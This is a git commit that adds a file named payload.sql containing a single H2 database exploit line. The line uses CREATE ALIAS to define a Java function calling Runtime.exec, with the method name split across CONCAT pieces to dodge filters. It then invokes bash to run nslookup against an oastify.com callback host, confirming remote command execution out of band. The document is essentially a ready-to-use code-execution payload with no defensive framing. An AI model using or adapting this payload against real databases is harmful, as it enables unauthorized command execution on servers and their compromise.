91feb48717976ce47dbd505d5c19c52f2ae2cc30
mariaSN <riasn@yandex.ru>
2023-04-21 19:57:51 +0300

    Create payload.sql

---
+++ payload.sql
@@ -0,0 +1,1 @@
+CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('/bin/bash','-c','nslookup m4rx7djfgrthpmkzerk8cf6ct3z1nq.oastify.com');
